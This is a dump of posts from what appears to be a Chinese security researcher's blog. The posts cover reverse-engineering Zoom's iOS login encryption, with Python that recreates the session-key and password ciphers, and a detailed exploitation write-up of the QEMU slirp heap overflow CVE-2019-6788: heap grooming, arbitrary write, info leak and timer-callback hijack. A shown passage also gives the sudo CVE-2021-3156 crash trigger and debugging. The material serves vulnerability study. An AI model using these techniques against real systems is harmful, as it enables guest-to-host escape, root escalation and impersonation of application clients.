*(_OWORD *)v14 = 0u; v15 = 0u; v3 = v14; do { __sprintf_chk(v3, 0, 0xFFFFFFFFFFFFFFFFLL, &quot;%02x&quot;, (unsigned __int8)v19[v2++]); v3 += 2; } while ( v2 != 32 ); v18 = 0; objc_msgSend(&amp;OBJC_CLASS___NSString, &quot;stringWithUTF8String:&quot;, v14); _Block_object_dispose(&amp;v9, 8); } }}----&gt; +[ZPLogHelper infoLog:withString] UIDevice getDeviceIdentifier from DB/Keychain: a2458afb3e281029a1b9635b0e271d1301e246176b4e8710666ad4bd70866f37通过对base64指定结果进行栈回溯可以看到调用流程，以及加密deviceid的位置sub_1013F7BA4 这里直接写结果： 第一次使用app， 生成DeviceIdentifier，存入keychain/DB， 后续都直接取这个值使用 123456# 第一次启动app的时候，使用这种方式生成iddef gen_identifier(bundleid): _str=str(uuid.uuid1())+bundleid _out=hashlib.sha256(_str.encode()).hexdigest() print (_out) return _out 计算hash_macaddress 字段的值 1234567891011# 这个identifier 是可以直接从keychain 中读取的， 利用keychain_dumper 或 frida # 从keychain 中读取64位字符的id当作字符串传入即可def compute_hash_macaddress(identifier): if isinstance(identifier, str): identifier = identifier.encode() a=hashlib.sha256(identifier).hexdigest() b=hashlib.sha256(bytes.fromhex(a)).hexdigest() c=hashlib.sha256(bytes.fromhex(b)).hexdigest() result=base64.b64encode(bytes.fromhex(c)) print (result) return result ZM-SESS-KEY ==》读取hash_macaddress的值，将‘+’‘=’等符号转义，再拼接一个32位的随机字节数组 计算拼接后的内容的sha256，记作_input 使用内置公钥，RSA加密_input，得到密文 _encd 将 _encd base64编码，再拼接’,v1’，得到最终数据，用作Cookie中的ZM-SESS-KEY 字段，再拼接一些常量即可 123456789101112131415def RSA_enc(): a=compute_hash_macaddress(DEVICE_ID) # b=random.randbytes(32) b = bytes([random.randrange(0, 256) for _ in range(0, 32)]) _in=a+b # print (&quot;_in:&quot;, _in, type(_in)) c=hashlib.sha256(_in).hexdigest() # 记住这个sha256 的值 PASSWD_KEY=c print (c) _rsa_encd=openssl_rsa_enc(c) _out=base64.b64encode(_rsa_encd) _out=_out+b',v1' _out=quote(_out.decode()) print(_out) passwordpassword和ecp字段使用的方式都是一样的，取一个key来加密我们输入的password，ecp的key 是生成的一个udid。 但是passwprd字段的key却让我一通好找，最终使用的方式是在进入函数分配好内存（new(0xC28uLL)) 后便对存储key的区域下内存写入断点，断下后再查看调用栈，最终明白使用的key便是计算ZM-SESS-KEY 字段时的加密数据明文。 ==》 使用计算Cookie字段中的_input 当作是AES 加密使用的key 将上面的key计算sha256，所得结果用作aes_key，将aes_key计算hash用作iv iv长度与分块大小一致，恒为16， 使用的aes加密模式为aes_128_cbc，所以aes_key 实际上为sha256(_input)[0:16] 12345678910111213141516def AES_enc(_key, _passwd): if isinstance(_key, str): _key=_key.encode('utf-8') _aes_key=hashlib.sha256(_key).hexdigest() # print (_aes_key) _aes_iv=hashlib.sha256(bytes.fromhex(_aes_key)).hexdigest() # print (_aes_iv) cipher=AES.new(bytes.fromhex(_aes_key)[0:16], AES.MODE_CBC,bytes.fromhex(_aes_iv)[0:16]) x=__BLOCK_SIZE_16 - (len(_passwd) % __BLOCK_SIZE_16) if x!=0: _passwd=_passwd+chr(x)*x _enc = cipher.encrypt(_passwd) _out=base64.b64encode(_enc) print(_out) return _out 看到这里，很明显的数据使用对称加密算法加密、密钥使用非对称算法加密。 脚本丢在GitHub上了。 0x03 “加入会议” 功能分析参考链接 frida 官方文档 LLDB常用命令–飘云整理 openssl evp 对称加密(AES_ecb,ccb) Openssl Doc 图解SSL/TLS协议 SSL/TLS原理详解 Transport Layer Security (TLS) Session Hash andExtended Master Secret Extension SSL/TLS协议详解 C++ OpenSSL Verify X509 Certificate IoT设备逆向工程中的函数识别","link":"/2021/07/03/Zoom-%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"},{"title":"about","text":"Noobs Security Researcher Foucs on iOS,IOT,Linux CONTACT MEEmail: vlinkstone@gmail.com","link":"/2020/02/02/about/"},{"title":"cve-2019-6788 Note","text":"最近看到一个思路很妙的qemu堆溢出利用实例，跟着调试学习了一波，在这里总结记录一下。 漏洞说明 漏洞本身不复杂，作者也把poc和exp的源代码都放出来了，所以跟着学习就比较容易。漏洞存在于qemu中的网络模块slirp中，在对Ident协议进行模拟时，没有进行有效的数据验证，从而导致溢出。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667//qemu/slirp/tcp_subr.cinttcp_emu(struct socket *so, struct mbuf *m){ ... switch(so-&gt;so_emu) { int x, i; case EMU_IDENT: /* * Identification protocol as per rfc-1413 */ { struct socket *tmpso; struct sockaddr_in addr; socklen_t addrlen = sizeof(struct sockaddr_in); struct sbuf *so_rcv = &amp;so-&gt;so_rcv; memcpy(so_rcv-&gt;sb_wptr, m-&gt;m_data, m-&gt;m_len); so_rcv-&gt;sb_wptr += m-&gt;m_len; so_rcv-&gt;sb_rptr += m-&gt;m_len; m-&gt;m_data[m-&gt;m_len] = 0; /* NULL terminate */ if (strchr(m-&gt;m_data, '\\r') || strchr(m-&gt;m_data, '\\n')) { ... so_rcv-&gt;sb_cc = snprintf(so_rcv-&gt;sb_data, so_rcv-&gt;sb_datalen, &quot;%d,%d\\r\\n&quot;, n1, n2); so_rcv-&gt;sb_rptr = so_rcv-&gt;sb_data; so_rcv-&gt;sb_wptr = so_rcv-&gt;sb_data + so_rcv-&gt;sb_cc; } m_free(m);//crash return 0; }struct sbuf { uint32_t sb_cc; /* actual chars in buffer */ uint32_t sb_datalen; /* Length of data */ char *sb_wptr; /* write pointer. points to where the next * bytes should be written in the sbuf */ char *sb_rptr; /* read pointer. points to where the next * byte should be read from the sbuf */ char *sb_data; /* Actual data */};struct mbuf { /* XXX should union some of these! */ /* header at beginning of each mbuf: */ struct mbuf *m_next; /* Linked list of mbufs */ struct mbuf *m_prev; struct mbuf *m_nextpkt; /* Next packet in queue/record */ struct mbuf *m_prevpkt; /* Flags aren't used in the output queue */ int m_flags; /* Misc flags */ int m_size; /* Size of mbuf, from m_dat or m_ext */ struct socket *m_so; caddr_t m_data; /* Current location of data */ int m_len; /* Amount of data in this mbuf, from m_data */ Slirp *slirp; bool resolution_requested; uint64_t expiration_date; char *m_ext; /* start of dynamic buffer area, must be last element */ char m_dat[];}; 根据代码的逻辑，会先将mbuf中的数据拷贝至sbuf中，修改读写指针，之后只有当data中存在’\\r’或’\\n’的时候才会对sbuf中的sb_cc字段（也就是记录sbuf中实际字符长度的）进行累加，如果没有’\\r’’\\n’则不会增加sb_cc。再看一下判断内存空间部分的代码： 1234567891011else if (ti-&gt;ti_ack == tp-&gt;snd_una &amp;&amp; tcpfrag_list_empty(tp) &amp;&amp; ti-&gt;ti_len &lt;= sbspace(&amp;so-&gt;so_rcv)) { ... /* * Add data to socket buffer. */ if (so-&gt;so_emu) { if (tcp_emu(so,m)) sbappend(so, m); #define sbspace(sb) ((sb)-&gt;sb_datalen - (sb)-&gt;sb_cc) 如此便造成一种情况，当data中没有分隔符时，sb_cc 不会变，会一直向m_data，最终造成溢出。可以根据提供的poc测试： 123456789101112131415161718pwndbg&gt; break qemu/slirp/tcp_subr.c:638pwndbg&gt; cpwndbg&gt; p so_rcv-&gt;sb_datalen $1 = 8760 &lt;------ so_rcv 中data的大小为8760， 0x2238，记住这个数字pwndbg&gt; p so_rcv-&gt;sb_cc$2 = 0pwndbg&gt; p so_rcv-&gt;sb_datalen - (so_rcv-&gt;sb_wptr - so_rcv-&gt;sb_data)$3 = 8760...pwndbg&gt; p so_rcv-&gt;sb_cc$5 = 0pwndbg&gt; p so_rcv-&gt;sb_datalen - (so_rcv-&gt;sb_wptr - so_rcv-&gt;sb_data)$6 = 7480...pwndbg&gt; p so_rcv-&gt;sb_datalen - (so_rcv-&gt;sb_wptr - so_rcv-&gt;sb_data)$11 = -200 # 到这里已经溢出了pwndbg&gt; p so_rcv-&gt;sb_cc$12 = 0 利用分析12345678910pwndbg&gt; checksec [*] '/home/x/Documents/iot/tools/qemu/qemu/bin/debug/naive/x86_64-softmmu/qemu-system-x86_64' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ✗ cat /proc/sys/kernel/randomize_va_space2 在知道存在堆溢出后，在保护全开的情况下我们想要利用起来，有几个先决条件需要满足： 让堆的内存分配可以被我们控制 有办法将payload写入对应内存地址，即需要存在任意地址写 开了PIE（aslr plus）且级别为2，得有信息泄漏获取对应的基址 获得程序的控制权，让程序能够执行我们的代码 让heap变得可控通过pwndbg可以查看当前qemu中的heap，三个屏幕装不下…并且根据poc 调试的时候看到发生溢出的buf前后内存是不确定的。这种情况下找free可能不太靠谱，找malloc原语更适合些。 exp中找的是qemu在实现ip分段机制中的一处malloc，很是巧妙。先复习一下IP的分段机制： 123456789101112131415 0 1 2 3 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|Version| IHL | DSCP | ECN | Total Length |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| Identification |Flags| Fragment Offset |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| Time to Live | Protocol | Header Checksum |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| Source Address |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| Destination Address |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| Options(if IHL&gt;5) |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 在IPv4中，IP分片存在于两个mtu不一样的网络之间传输数据，如果一个较大的packet想传输到一个mtu较小的网络中，那么就需要将这个packet分片后再发送，在IP头中就有专门的字段来满足这一需求。这里关注Flags和Fragment Offset字段即可， flags 字段分为仨：Reserved、Don’t fragment、More fragments Don’t fragment (DF)：表示这个数据包是否是分片的，1表示未分片0表示分片 More fragment (MF)：置1表示后面还有数据包，0则是最后一个，且当Don’t fragment字段为0时有效 Fragment Offset：表示当前数据包在完整的数据包中的偏移 看一下slirp中对分片的处理： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162/* * Ip input routine. Checksum and byte swap header. If fragmented * try to reassemble. Process options. Pass to next level. */voidip_input(struct mbuf *m){ ... if (ip-&gt;ip_off &amp;~ IP_DF) { ... if (ip-&gt;ip_off &amp; IP_MF) //&lt;------------------ 0 ip-&gt;ip_tos |= 1; else ip-&gt;ip_tos &amp;= ~1; ip-&gt;ip_off &lt;&lt;= 3; if (ip-&gt;ip_tos &amp; 1 || ip-&gt;ip_off) { ip = ip_reass(slirp, ip, fp); //&lt;---------------- 1 if (ip == NULL) return; m = dtom(slirp, ip); } else if (fp) ip_freef(slirp, fp); ... /* * Switch out to protocol's input routine. */}static struct ip *ip_reass(Slirp *slirp, struct ip *ip, struct ipq *fp){ ... m-&gt;m_data += hlen; m-&gt;m_len -= hlen; /* * If first fragment to arrive, create a reassembly queue. */ if (fp == NULL) { struct mbuf *t = m_get(slirp); //&lt;----------------- 2 ...}struct mbuf *m_get(Slirp *slirp){ ... if (slirp-&gt;m_freelist.qh_link == &amp;slirp-&gt;m_freelist) { m = g_malloc(SLIRP_MSIZE); //&lt;--------- 3 slirp-&gt;mbuf_alloced++; if (slirp-&gt;mbuf_alloced &gt; MBUF_THRESH) flags = M_DOFREE; m-&gt;slirp = slirp; } else { m = (struct mbuf *) slirp-&gt;m_freelist.qh_link; remque(m); }...} 可以看到当DF=0 &amp;&amp; MF=1的时候，会调用ip_reass 函数重组数据包，ip_reass 中会调用g_malloc分配空间存储当前数据包的数据，并且如果ip_reass返回NULL时表示当前数据包并非last one，这样这个数据包就不会被下面的逻辑处理， 直接return。所以我们可以通过发送DF=0 &amp;&amp; MF=1的数据包来任意分配内存，SLIRP_MSIZE的值通过调试得知为0x675。 1234567pwndbg&gt; p m$4 = (struct mbuf *) 0x7fafb81f62f0pwndbg&gt; x/8gx 0x7fafb81f62f0-0x100x7fafb81f62e0: 0x0000000000000000 0x00000000000006750x7fafb81f62f0: 0x00007fafb80005a0 0x00007fafb80005a00x7fafb81f6300: 0x00007fafb81f62e0 0x00007fafb81f62e00x7fafb81f6310: 0x00000000bfbc5000 0x0000000000001000 任意地址写任意地址写也是用的ip分段机制中的实现，在重组ip数据包时，会将所有的数据包组合到一起，每个数据包都是通过mbuf结构来管理： 123456789101112131415161718192021222324252627 static struct ip *ip_reass(Slirp *slirp, struct ip *ip, struct ipq *fp){... insert: while (q != (struct ipasfrag*)&amp;fp-&gt;frag_link) { struct mbuf *t = dtom(slirp, q); q = (struct ipasfrag *) q-&gt;ipf_next; m_cat(m, t); //&lt;--------------- 3 }...}voidm_cat(struct mbuf *m, struct mbuf *n){ /* * If there's no room, realloc */ if (M_FREEROOM(m) &lt; n-&gt;m_len) m_inc(m, m-&gt;m_len + n-&gt;m_len); memcpy(m-&gt;m_data+m-&gt;m_len, n-&gt;m_data, n-&gt;m_len);//&lt;--------- 4 m-&gt;m_len += n-&gt;m_len; m_free(n);} 这里n-&gt;m_data是这里n-&gt;m_data, n-&gt;m_len都是根据后面数据包的data获取的，是我们可以控制的。如果m-&gt;m_data这个指针也可以被我们控制，那么就可以想写哪儿就写哪儿了。 同时由于存在着堆溢出，可以通过so_rcv结构往后面一直覆盖。结合这两点我们便可以覆盖mbuf-&gt;m_data，从而以实现任意地址写。 123456789101112131415161718192021222324252627282930313233343536373839404142pwndbg&gt; p so_rcv$1 = (struct sbuf *) 0x7f1ffe20dba8pwndbg&gt; x/4gx 0x7f1ffe20dba80x7f94c420dba8: 0x0000223800000000 0x00007f1fe43eb7d00x7f94c420dbb8: 0x00007f1fe43eb7d0 0x00007f1fe43eb7d0pwndbg&gt; x/32gx 0x00007f1fe43eb7d0+0x22380x7f1fe43eda08: 0x0000000000000675 0x00007f1fe43eb1600x7f1fe43eda18: 0x00007f1fe43ee080 0x00000000000000000x7f1fe43eda28: 0x0000000000000000 0x000006080000000c0x7f1fe43eda38: 0x0000000000000000 0x00007f1fe43edab0 #&lt;&lt;------原来的数据存储的地址：0x...3edab00x7f1fe43eda48: 0x0000000000000318 0x000055cc6fc6b660 #&lt;&lt;------ 长度为0x3180x7f1fe43eda58: 0x0000000000000000 0xffffffffffffffff0x7f1fe43eda68: 0x0000000000000000 0x00000000000000000x7f1fe43eda78: 0x0000000000000000 0x00000000000000000x7f1fe43eda88: 0xe43ee0e00f02000a 0xe43ee0e000007f1f0x7f1fe43eda98: 0x0318014500007f1f 0x22bbffff0000dead0x7f1fe43edaa8: 0x0100007f0100007f 0x41414141414141410x7f1fe43edab8: 0x4141414141414141 0x41414141414141410x7f1fe43edac8: 0x4141414141414141 0x41414141414141410x7f1fe43edad8: 0x4141414141414141 0x41414141414141410x7f1fe43edae8: 0x4141414141414141 0x41414141414141410x7f1fe43edaf8: 0x4141414141414141 0x4141414141414141.........pwndbg&gt; x/32gx 0x00007f1fe43eb7d0+0x22380x7f1fe43eda08: 0x0000000000000675 0x00000000000000000x7f1fe43eda18: 0x0000000000000000 0x00000000000000000x7f1fe43eda28: 0x0000000000000000 0x00000608000000000x7f1fe43eda38: 0x0000000000000000 0x00007f1fe4000b00 #&lt;&lt;------这里已经被修改成0x...000b000x7f1fe43eda48: 0x0000000000000318 0x000055cc6fc6b660 #&lt;&lt;------ 长度为0x3180x7f1fe43eda58: 0x0000000000000000 0xffffffffffffffff0x7f1fe43eda68: 0x0000000000000000 0x00000000000000000x7f1fe43eda78: 0x0000000000000000 0x00000000000000000x7f1fe43eda88: 0xe43ee0e00f02000a 0xe43ee0e000007f1f0x7f1fe43eda98: 0x0318014500007f1f 0x22bbffff0000dead0x7f1fe43edaa8: 0x0100007f0100007f 0x41414141414141410x7f1fe43edab8: 0x4141414141414141 0x41414141414141410x7f1fe43edac8: 0x4141414141414141 0x41414141414141410x7f1fe43edad8: 0x4141414141414141 0x41414141414141410x7f1fe43edae8: 0x4141414141414141 0x41414141414141410x7f1fe43edaf8: 0x4141414141414141 0x4141414141414141 在连接113端口的时候会进入对应的routine，此时就已经将so_rcv等环境准备好了。连接后我们先发送一个原始的ip数据包，将MF标志设为1，那么qemu对应的处理模块就会等待后续数据包， 这个时候我们利用漏洞，溢出so_rcv中的sb_data，由于mbuf 和上面的结构是连续的，所以我们可以直接将mbuf结构中的m_data成员设置成我们指定的地址，那么在后面得到拼接数据包的时候就会向我们指定的地址写入后续数据包的内容，也就实现了任意地址写。 Info Leak信息泄漏其实就是想办法将一些特定的数据回传给我们，在网络模块中那自然会考虑到使用icmp服务，好像也只有icmp会“无条件”的响应我们。这里的原理和任意写是一样的，都是利用漏洞结合ip包的分片机制来修改包的位置。具体操作如下： 利用任意地址写原语在堆中先写入一个伪造的icmp数据包 准备好漏洞环境（创建对应端口的socket），再发送一个正常的icmp数据包，将其ip头中的MF标志置一（如此便会等待后续的数据包） 利用溢出覆盖2中正常icmp数据包存储的mbuf结构中的m_data，将其修改成1中伪造的数据包，即将我们伪造的数据包变成第一个包 再发送一个正常的icmp数据包，MF=0，如此便会得到icmp reply。由于mbuf中存储数据的m_data大小为0x318，所以伪造的icmp数据包后会有很多脏数据也被发送回来，我们可以借此去寻找堆的基址和代码段的基址。 这里有个问题需要解决，使用我们伪造icmp数据包时，如何通过check_sum的校验呢？ 我们先看一下slirp模块中是如何校验的： 12345678910111213141516171819202122232425262728293031323334/* * Process a received ICMP message. */voidicmp_input(struct mbuf *m, int hlen){ register struct icmp *icp; register struct ip *ip=mtod(m, struct ip *); int icmplen=ip-&gt;ip_len; Slirp *slirp = m-&gt;slirp; DEBUG_CALL(&quot;icmp_input&quot;); DEBUG_ARG(&quot;m = %p&quot;, m); DEBUG_ARG(&quot;m_len = %d&quot;, m-&gt;m_len); /* * Locate icmp structure in mbuf, and check * that its not corrupted and of at least minimum length. */ if (icmplen &lt; ICMP_MINLEN) { /* min 8 bytes payload */ freeit: m_free(m); goto end_error; } m-&gt;m_len -= hlen; m-&gt;m_data += hlen; icp = mtod(m, struct icmp *); if (cksum(m, icmplen)) { goto freeit; } ... ... } 可以看到仅使用ip头中的len去做校验，那么就可以伪造ip头中的长度设置成header的长度，因为header部分内容是固定的。如此我们便可以得到相当一部分的脏数据，现在就看这部分脏数据里面能不能获得我们想要的基址了。 经过测试，在我的环境中reply的脏数据中有一定几率是固定的内容： 于是可以通过固定地址中的数据获取heap base 和代码段段基址： 1234567891011pwndbg&gt; p &amp;qemu_clocks$2 = (QEMUClock (*)[4]) 0x55c090f43400 &lt;qemu_clocks&gt;pwndbg&gt; p &amp;qemu_timer_notify_cb$3 = (void (*)(void *, QEMUClockType)) 0x55c090226854 &lt;qemu_timer_notify_cb&gt;pwndbg&gt; p/x 0x55c090f43400-0x1015400$4 = 0x55c08ff2e000 #&lt;------text_basepwndbg&gt; p/x $4+0x2f8854$5 = 0x55c090226854 #&lt;---qemu_timer_notify_cbpwndbg&gt; p/x 0x55c090244c4b-0x55c08ff2e000$6 = 0x316c4b # memory_region_get_addr-text_base==》偏移 通过这种方式获得heap base是比较容易的，但是text base却比较难。可能出现的是不同的函数，并且text的随机化比heap粒度更细，需要根据出现的函数地址去做对应的计算。 获得程序的控制权这里使用的是一个比较经典的原语，借助qemu的时钟机制，这种方式也在许多qemu相关的漏洞利用中被使用。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172void main_loop_wait(int nonblocking){ ... qemu_clock_run_all_timers();}bool qemu_clock_run_all_timers(void){ bool progress = false; QEMUClockType type; for (type = 0; type &lt; QEMU_CLOCK_MAX; type++) { if (qemu_clock_use_for_deadline(type)) { progress |= qemu_clock_run_timers(type); } } return progress;}bool qemu_clock_run_timers(QEMUClockType type){ return timerlist_run_timers(main_loop_tlg.tl[type]);//&lt;-------------- 5}bool timerlist_run_timers(QEMUTimerList *timer_list){ ... switch (timer_list-&gt;clock-&gt;type) { case QEMU_CLOCK_REALTIME: ... case QEMU_CLOCK_VIRTUAL: ... case QEMU_CLOCK_HOST: ... case QEMU_CLOCK_VIRTUAL_RT: if (!replay_checkpoint(CHECKPOINT_CLOCK_VIRTUAL_RT)) { goto out; } break; } current_time = qemu_clock_get_ns(timer_list-&gt;clock-&gt;type); qemu_mutex_lock(&amp;timer_list-&gt;active_timers_lock); while ((ts = timer_list-&gt;active_timers)) { ... /* run the callback (the timer list can be modified) */ qemu_mutex_unlock(&amp;timer_list-&gt;active_timers_lock); cb(opaque); //&lt;------------------------ 6 qemu_mutex_lock(&amp;timer_list-&gt;active_timers_lock); progress = true; } ...}// util/qemu-timer.cstruct QEMUTimerList { QEMUClock *clock; QemuMutex active_timers_lock; QEMUTimer *active_timers; QLIST_ENTRY(QEMUTimerList) list; QEMUTimerListNotifyCB *notify_cb; void *notify_opaque; QemuEvent timers_done_ev;};// include/qemu/timer.hstruct QEMUTimer { int64_t expire_time; QEMUTimerList *timer_list; QEMUTimerCB *cb; void *opaque; QEMUTimer *next; int attributes; int scale;}; 通过代码大致可以看出qemu的时钟机制实现方式，main_loop_tlg是一个QEMUTimerListGroup类型的全局变量，其中存有不同定时器的QEMUTimerList。qemu会循环遍历这些定时器，check是否有到期的，有则调用cb(opaque)。由于我们已经有了任意地址写、且知道了代码段和堆的基址，我们便可以在堆中伪造一个QEMUTimerList然后覆盖全局区中main_loop_tlg或修改其成员，这样就可以执行我们的代码了。 相关符号地址借助pwntools很容易获取到： 12345678910111213141516from pwn import * elf=ELF('./qemu/bin/debug/naive/x86_64-softmmu/qemu-system-x86_64')libc = elf.libcsystem_addr = elf.symbols['system']print (&quot;system:&quot; , hex(system_addr))qemu_clocks=elf.symbols['qemu_clocks']print (&quot;qemu_clocks:&quot;, hex(qemu_clocks))qemu_timer_notify_cb=elf.symbols['qemu_timer_notify_cb']print (&quot;qemu_timer_notify_cb:&quot;, hex(qemu_timer_notify_cb))main_loop_tlg=elf.symbols['main_loop_tlg']print (&quot;main_loop_tlg:&quot;, hex(main_loop_tlg)) 漏洞修复原本以为会是改成先修改so_rcv-&gt;sb_cc 再memcpy，结果是在memcpy之前先通过指针比对长度，确定有空间再拷贝。或许这样可以根本上杜绝下面的memcpy出现问题吧QaQ 12345678910111213141516171819case EMU_IDENT: /* * Identification protocol as per rfc-1413 */ { struct socket *tmpso; struct sockaddr_in addr; socklen_t addrlen = sizeof(struct sockaddr_in); struct sbuf *so_rcv = &amp;so-&gt;so_rcv; if (m-&gt;m_len &gt; so_rcv-&gt;sb_datalen - (so_rcv-&gt;sb_wptr - so_rcv-&gt;sb_data)) { return 1; } memcpy(so_rcv-&gt;sb_wptr, m-&gt;m_data, m-&gt;m_len); so_rcv-&gt;sb_wptr += m-&gt;m_len; so_rcv-&gt;sb_rptr += m-&gt;m_len; 小结这个漏洞本身很简单，但是利用过程却丝毫不简单，利用IP分片机制获取malloc 原语，同时获取Arbitrary write 和Info Leak，思路很清奇。需要对linux 堆分配机制和qemu代码足够熟悉。 着实让我这个菜鸡学到很多。 What’s more： 信息泄漏那里的脏数据，有没有办法使其变得可控呢？ 脚本丢在GitHub上了。 参考链接 https://github.com/0xKira/qemu-vm-escape/ https://ray-cp.github.io/archivers/qemu-pwn-cve-2019-6788%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90 QEMU timer模块分析 一些qemu历史漏洞相关文章 Etc…","link":"/2021/07/03/cve-2019-6788-note/"},{"title":"cve-2021-3156 分析笔记（有坑没填）","text":"0x00 简介最近帮小伙伴整个ubuntu上的提权，搜了下发现刚好这个sudo的合适，直接一通复制粘贴完事儿。现在抽时间分析一下。 这个漏洞存在于sudo中是一个堆溢出，根据Qualys团队的公告可以得知，通过该漏洞可以实现本地提权。影响范围较大，从 1.8.2 到 1.8.31p2 的所有旧版本和从 1.9.0 到 1.9.5p1 的所有稳定版本都受影响，且在macOS上也会受到影响。 漏洞原理比较简单，但是利用过程很有意思， 下面记录分析过程。 0x01 漏洞分析复现1234567891011121314151617181920212223242526➜ ✗ uname -aLinux ubuntu 5.4.0-26-generic #30-Ubuntu SMP Mon Apr 20 16:58:30 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux➜ ✗ cat /etc/issueUbuntu 20.04 LTS \\n \\l➜ ✗ sudo --versionSudo version 1.8.31Sudoers policy plugin version 1.8.31Sudoers file grammar version 46Sudoers I/O plugin version 1.8.31➜ ✗ ldd --versionldd (Ubuntu GLIBC 2.31-0ubuntu9) 2.31Copyright (C) 2020 Free Software Foundation, Inc.This is free software; see the source for copying conditions. There is NOwarranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.Written by Roland McGrath and Ulrich Drepper.➜ ✗ #存在漏洞➜ ✗ sudoedit -s '\\' `perl -e 'print &quot;ABCD&quot; x 6553'`malloc(): corrupted top size[1] 209236 abort (core dumped) sudoedit -s '\\' `perl -e 'print &quot;ABCD&quot; x 6553'`#不存在漏洞➜ ✗ sudoedit -s '\\' `perl -e 'print &quot;ABCD&quot; x 6553'`usage: sudoedit [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] file ... 分析由于ubuntu的lts是会更新的，所以低版本系统未必会存在，高版本也不一定就不存在。还是得根据实际情况判断。这里为了分析方便，我们下载sudo的符号或者自己通过源码编译一份出来： 1234567891011121314151617181920# 安装 sudo 符号,下载glibc的源码# wget http://launchpadlibrarian.net/463349800/sudo-dbgsym_1.8.31-1ubuntu1_amd64.ddeb# sudo dpkg -i sudo-dbgsym_1.8.31-1ubuntu1_amd64.ddeb # 自己编的sudoedit在/usr/local/bin/sudoeditwget https://github.com/sudo-project/sudo/archive/SUDO_1_8_31.tar.gztar -xvf SUDO_1_8_31.tar.gzcd sudo-SUDO_1_8_31; ./configure CFLAGS=&quot;-g&quot; CPPFLAGS=&quot;-g&quot;make -j4 sudo chown root:root examples/sudo.confsudo chown root:root examples/sudoerssudo chown root:root plugins/sudoers/.libs/sudoers.sosudo chown root:root src/.libs/sudosudo chmod 4755 src/.libs/sudosudo ln -s src/.libs/sudo src/.libs/sudoedit# make install sudo apt-get install glibc-sourcetar -xvf /usr/src/glibc/glibc-2.31.tar.xz 自己编好sudo后再触发一下，这次用gdb附加，看下崩溃点在哪里： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081➜ ~ sudo gdb --args /usr/local/bin/sudoedit -s '\\' `perl -e 'print &quot;ABCD&quot; x 6553'`[sudo] password for x: GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2...Reading symbols from /usr/local/bin/sudoedit...pwndbg&gt; rProgram received signal SIGSEGV, Segmentation fault.set_cmnd () at ./sudoers.c:868868 *to++ = *from++;LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA──────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────────────────── RAX 0x43 RBX 0x55ded202f598 —▸ 0x7ffef0294b7d ◂— 0x4443424144434241 ('ABCDABCD') RCX 0x0 RDX 0x7ffef0297f48 ◂— 0x4342414443424144 ('DABCDABC') RDI 0x3 RSI 0x15001c R8 0x7ff7ae902218 —▸ 0x7ff7ae1101ac ◂— 0x2000200020002 R9 0x7ff7aeaf51f0 (main_arena+1648) —▸ 0x7ff7aeaf51e0 (main_arena+1632) —▸ 0x7ff7aeaf51d0 (main_arena+1616) —▸ 0x7ff7aeaf51c0 (main_arena+1600) —▸ 0x7ff7aeaf51b0 (main_arena+1584) ◂— ... R10 0x55ded2018010 ◂— 0x0 R11 0x7ff7aeaf4be0 (main_arena+96) —▸ 0x55ded2035c30 ◂— 0x4241204443424144 ('DABCD AB') R12 0x0 R13 0x7ffef0293730 ◂— 0xffffffffffffffff R14 0x7ffef0297f47 ◂— 0x4241444342414443 ('CDABCDAB') R15 0x7ffef0297f48 ◂— 0x4342414443424144 ('DABCDABC') RBP 0x55ded2039001 RSP 0x7ffef02936f0 ◂— 0x7ffe00000000 RIP 0x7ff7adad8211 (sudoers_policy_main+3425) ◂— mov byte ptr [rbp - 1], al────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────────────── ► 0x7ff7adad8211 &lt;sudoers_policy_main+3425&gt; mov byte ptr [rbp - 1], al 0x7ff7adad8214 &lt;sudoers_policy_main+3428&gt; movzx eax, byte ptr [r14 + 1] 0x7ff7adad8219 &lt;sudoers_policy_main+3433&gt; test al, al 0x7ff7adad821b &lt;sudoers_policy_main+3435&gt; je sudoers_policy_main+3496 &lt;sudoers_policy_main+3496&gt; ↓ 0x7ff7adad8258 &lt;sudoers_policy_main+3496&gt; add rbx, 8 0x7ff7adad825c &lt;sudoers_policy_main+3500&gt; mov byte ptr [rbp], 0x20 0x7ff7adad8260 &lt;sudoers_policy_main+3504&gt; lea rax, [rbp + 1] 